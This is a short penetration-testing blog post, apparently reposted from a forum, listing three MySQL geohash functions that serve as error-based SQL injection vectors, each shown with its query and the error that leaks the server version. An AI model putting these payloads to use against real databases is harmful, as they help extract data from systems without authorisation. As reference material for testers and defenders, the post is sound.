---
layout: post
tags: [渗透测试, mysql,others]
---


```bash

New error-based SQL Injection vectors in MySQL >= 5.7.5

1. ST_LatFromGeoHash()
mysql> select ST_LatFromGeoHash(version());
ERROR 1411 (HY000): Incorrect geohash value: '5.7.6-m16-log' for function ST_LATFROMGEOHASH


2. ST_LongFromGeoHash()
mysql> select ST_LongFromGeoHash(version());
ERROR 1411 (HY000): Incorrect geohash value: '5.7.6-m16-log' for function ST_LONGFROMGEOHASH


3. ST_PointFromGeoHash()
mysql> select ST_PointFromGeoHash(version(),0);
ERROR 1411 (HY000): Incorrect geohash value: '5.7.6-m16-log' for function st_pointfromgeohash



#来源: https://rstforums.com/forum/topic/92898-new-error-based-sql-injection-vectors-in-mysql-575/

```